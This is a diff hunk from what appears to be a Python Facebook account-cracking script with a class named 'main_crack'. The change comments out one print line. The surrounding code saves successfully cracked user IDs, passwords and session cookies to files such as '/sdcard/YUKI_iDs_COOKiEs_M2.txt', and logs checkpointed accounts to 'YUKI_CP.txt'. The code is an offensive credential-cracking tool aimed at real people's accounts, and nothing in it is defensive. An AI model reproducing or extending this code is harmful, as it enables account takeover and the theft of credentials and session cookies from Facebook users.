@@ -385,7 +385,7 @@ class main_crack():
                     open('/sdcard/YUKI_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/YUKI_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                     break
                 elif 'www.facebook.com' in q['error']['message']:
-                      print(f"\r{A} [YUKI-CP] {sid} | {ps} {S}")
+                     # print(f"\r{A} [YUKI-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/YUKI_CP.txt','a').write(sid+'|'+ps+'\n')
                 else:
